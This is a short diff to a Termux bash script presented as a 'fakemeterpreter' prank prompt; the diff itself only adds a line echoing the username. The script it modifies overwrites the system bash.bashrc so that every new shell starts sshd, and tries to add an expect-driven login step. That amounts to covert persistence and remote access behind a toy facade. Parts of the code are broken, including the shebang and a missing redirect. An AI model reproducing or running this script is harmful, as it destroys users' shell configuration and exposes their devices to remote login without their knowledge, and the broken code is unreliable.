@@ -1,6 +1,7 @@
 #!bin/bash
 user=$(whoami)
 ifconfig
+echo "$user"
 read -p "fakemeterpreter> " ip
 echo -e "sshd\n" > "/data/data/com.termux/files/usr/etc/bash.bashrc"
 echo -e "expect login.exp\n" "/data/data/com.termux/files/usr/etc/bash.bashrc"
